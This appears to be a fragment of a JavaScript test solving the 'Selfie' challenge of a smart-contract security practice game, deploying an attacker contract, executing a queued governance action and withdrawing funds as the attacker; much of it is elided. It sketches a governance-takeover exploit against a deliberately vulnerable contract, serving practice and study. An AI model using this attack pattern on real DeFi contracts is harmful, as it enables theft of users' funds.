...
describe("[Challenge] Selfie", function () {
  ...
  it("Exploit", async function () {
    const SelfieAttacker = await ethers.getContractFactory(
      "SelfieAttacker",
      deployer
    );
    ...
    const tx = await this.governance.queryFilter("ActionQueued");
    const actionId = tx[0].args.actionId;

    await this.governance.executeAction(actionId);

    await selfieAttacker.connect(attacker).withdraw();
  });
